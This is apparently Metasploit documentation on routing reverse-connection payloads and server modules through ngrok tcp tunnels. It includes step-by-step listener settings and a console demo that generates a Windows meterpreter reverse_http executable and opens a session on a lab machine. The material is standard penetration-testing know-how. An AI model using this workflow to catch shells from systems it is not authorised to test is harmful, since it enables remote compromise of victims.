# Overview
[ngrok][1] is a popular service that offers free port-forwarding that is easy to setup without needing to run a
dedicated server on a public IP address (as is the case with SSH, socat and other more traditional options. This means
that users behind a SNATing device such as a SOHO router can accept reverse shells and other connections without needing
to configure port forwarding.

**WARNING:** The nature of using ngrok is to send traffic through a third party. ngrok and the server which it utilizes
are not affiliated with the Metasploit project. Use of ngrok effectively sends traffic through an untrusted third party
and should be done with extreme caution. While Meterpreter has offered end-to-end encryption since Metasploit 6.0, other
payloads and connections do not.

ngrok can start multiple types of tunnels. The `tcp` tunnel is compatible with Metasploit's payloads and most closely
resembles a traditional port-forwarding configuration. The `http` tunnel type is not compatible with payloads, and
should not be used. The `tls` tunnel type may be compatible, but access to it is restricted to the Enterprise and 
Pay-as-you-go paid plans. This document will focus on the use cases for the `tcp` tunnel type. Note that one limitation
is that the public port can not be configured, it is randomly selected by ngrok meaning that the target will need to be
able to connect to this high, obscure port which may be prevented by egress filtering.

## Usage with payloads
Use with payloads can be achieved with any of the reverse-connection stagers that accept `LHOST` and `LPORT` options,
e.g. reverse_tcp, reverse_http, reverse_https, etc. but not reverse_named_pipe. In the following scenario, ngrok will be
used to forward a random public port to the Metasploit listener on port 4444. This scenario assumes that Metasploit and
ngrok are running on the same host.

**NOTE:** At this time, payloads handle DNS hostnames inconsistently. Some are compatible with hostnames while others
require IP addresses to be specified as the target to connect to (the `LHOST` option). To ensure the specified payload
will work, the hostname provided by ngrok should be resolved to an IP address and the IP address should be used as the
value for `LHOST`.

1. Start a TCP tunnel using ngrok: `ngrok tcp localhost:4444`.
1. ngrok should start running and display a few settings, including a line that says "Forwarding". Note the host and
   port number from this line, e.g. `4.tcp.ngrok.io:13779`
1. Resolve the hostname from the previous step to an IP address.
1. Start msfconsole and use the desired payload or exploit module.
  * Using `msfconsole` for both generating the payload and handling the connection is recommended over using `msfvenom`
    for two reasons.
    1. Using `msfvenom` starts up an instance of the framework to generate the payload, making it a slower process.
    2. Using `msfconsole` to configure both the payload and handler simultaneously ensures that the options are set for
       both, eliminating the possibility that they are out of sync.
1. Set the `LHOST` option to the IP address noted in step 3. This is where the payload is expecting to connect to.
1. Set the `LPORT` option to the port noted in step 2, `13779` in the example.
1. Set the `ReverseListenerBindAddress` option to `127.0.0.1`. This is where the connection will actually be accepted
   from ngrok.
1. Set the `ReverseListenerBindPort` option to `4444`.
1. Either run the exploit, or generate the payload with the `generate` command and start the handler with `to_handler`

Once the payload has been executed, either through the exploit or manual means, there should be a open connection seen
through the ngrok terminal.

### Payload Demo

ngrok side:
```
$ ngrok tcp localhost:4444
ngrok                                                           (Ctrl+C to quit)

Take our ngrok in production survey! https://forms.gle/aXiBFWzEA36DudFn6

Session Status                online
Account                       ????? (Plan: Personal)
Version                       3.16.0
Region                        United States (us)
Latency                       33ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://4.tcp.ngrok.io:17511 -> localhost:4444

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

resolve the hostname `4.tcp.ngrok.io` to an IP address
```
$ dig +short 4.tcp.ngrok.io
192.0.2.1
```

metasploit side:
```msf
msf6 > use payload/windows/x64/meterpreter/reverse_http
msf6 payload(windows/x64/meterpreter/reverse_http) > set LHOST 192.0.2.1
LHOST => 192.0.2.1
msf6 payload(windows/x64/meterpreter/reverse_http) > set LPORT 17511
LPORT => 17511
msf6 payload(windows/x64/meterpreter/reverse_http) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf6 payload(windows/x64/meterpreter/reverse_http) > set ReverseListenerBindPort 4444
ReverseListenerBindPort => 4444
msf6 payload(windows/x64/meterpreter/reverse_http) > to_handler 
[*] Payload Handler Started as Job 2
msf6 payload(windows/x64/meterpreter/reverse_http) > 
[*] Started HTTP reverse handler on http://127.0.0.1:4444

msf6 payload(windows/x64/meterpreter/reverse_http) > generate -f exe -o ngrok_payload.exe
[*] Writing 7168 bytes to ngrok_payload.exe...
msf6 payload(windows/x64/meterpreter/reverse_http) > 
[*] http://127.0.0.1:4444 handling request from 127.0.0.1; (UUID: ghzekibo) Staging x64 payload (202844 bytes) ...
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:55468) at 2024-09-10 16:43:58 -0400

msf6 payload(windows/x64/meterpreter/reverse_http) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: MSFLAB\smcintyre
meterpreter >
```

## Usage with server modules
Some modules expect connections to be made to them by the target. These modules can also be used with ngrok, with some
slight variations to the payload workflow in regards to their datastore options. Modules that start servers can be
identified by using the `SRVHOST` and `SRVPORT` datastore options.

**NOTE:** Free ngrok plans can only open one tcp tunnel at a time. This means that if the module is an exploit that a
tcp tunnel for a reverse-connection payload will not be able to be opened at the same time. Use a second ngrok account
to open a second tcp tunnel and follow the steps above for the payload configuration.

1. Start a TCP tunnel using ngrok: `ngrok tcp localhost:4444`.
1. ngrok should start running and display a few settings, including a line that says "Forwarding". Note the host and
   port number from this line, e.g. `4.tcp.ngrok.io:13779`
1. Resolve the hostname from the previous step to an IP address.
1. Start msfconsole and use the desired module.
1. Set the `LHOST` option to the IP address noted in step 3. This is where the payload is expecting to connect to.
1. Set the `SRVPORT` option to the port noted in step 2, `13779` in the example.
1. Set the `ListenerBindAddress` option to `127.0.0.1`. This is where the connection will actually be accepted
   from ngrok.
1. Set the `ListenerBindPort` option to `4444`.
1. Run the module

[1]: https://ngrok.com/
